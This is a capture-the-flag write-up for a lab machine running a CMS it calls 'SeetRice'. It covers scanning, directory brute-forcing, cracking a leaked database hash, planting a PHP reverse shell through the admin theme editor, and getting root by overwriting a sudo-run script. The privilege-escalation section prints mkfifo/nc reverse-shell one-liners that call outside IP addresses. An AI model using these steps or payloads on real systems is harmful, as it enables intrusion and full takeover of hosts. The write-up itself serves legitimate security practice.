> Author: jak010  
> Date: 2021.05.23

## Scan
- Command
	```sh
	$ nmap -sC -sV EXPORT_IP
	```
- Result
	```text
	Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-22 12:19 EDT
	Nmap scan report for 10.10.228.53
	PORT   STATE SERVICE VERSION
	22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
	|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
	|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
	80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
	|_http-server-header: Apache/2.4.18 (Ubuntu)
	|_http-title: Apache2 Ubuntu Default Page: It works
	```

## Enumeration
- `Web`
	- Directory Brute Forcing
		```
		...
		Gobuster v3.1.0
		by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
		===============================================================
		[+] Url:                     http://10.10.228.53
		[+] Method:                  GET
		[+] Threads:                 10
		[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt
		[+] Negative Status codes:   404
		[+] User Agent:              gobuster/3.1.0
		[+] Timeout:                 10s
		===============================================================
		2021/05/22 12:22:44 Starting gobuster in directory enumeration mode
		===============================================================
		/content              (Status: 301) [Size: 314] [--> http://10.10.228.53/content/]
		...
		```
		```
		===============================================================
		Gobuster v3.1.0
		by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
		===============================================================
		[+] Url:                     http://10.10.228.53/content
		[+] Method:                  GET
		[+] Threads:                 10
		[+] Wordlist:                raft-large-directories-lowercase.txt
		[+] Negative Status codes:   404
		[+] User Agent:              gobuster/3.1.0
		[+] Timeout:                 10s
		===============================================================
		2021/05/22 12:48:28 Starting gobuster in directory enumeration mode
		===============================================================
		/images               (Status: 301) [Size: 321] [--> http://10.10.228.53/content/images/]
		/js                   (Status: 301) [Size: 317] [--> http://10.10.228.53/content/js/]    
		/inc                  (Status: 301) [Size: 318] [--> http://10.10.228.53/content/inc/]   
		/_themes              (Status: 301) [Size: 322] [--> http://10.10.228.53/content/_themes/]
		/attachment           (Status: 301) [Size: 325] [--> http://10.10.228.53/content/attachment/]
		/as                   (Status: 301) [Size: 317] [--> http://10.10.228.53/content/as/]   
		```
	- Web CMS Version : `SeetRice`

## Leaked DataBase Backup File 
- `http://10.10.228.53/content/inc/mysql_backup/`
	```sh
	..42f749ade7f9e195bf475f37a44cafcb
	```
	- crackstation decrypt
- Credential
	- manager:Password123

## Gaining Access
- Admin Page : `http://10.10.228.53/content/as`
	- Source Changes
		- Reverse Shell : php-reverse-shell.php
		- `http://10.10.228.53/content/as/?type=theme&mode=save&page=Category%20page%20template.`
- Access Page : `http://10.10.228.53/content/_themes/default/cat.php`


## PRIVILEGE ESCALATE
- sudo -l
	```
	Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
	User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
	```
- Walk-Thought
	```sh
	$ cat /home/itguy/backup.pl
	#!/usr/bin/perl
	system("sh", "/etc/copy.sh");
	$ cat /etc/copy.sh
	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
	echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.26.67 5001 >/tmp/f" > /etc/copy.sh
	```
	- ReverShell Listen && Root 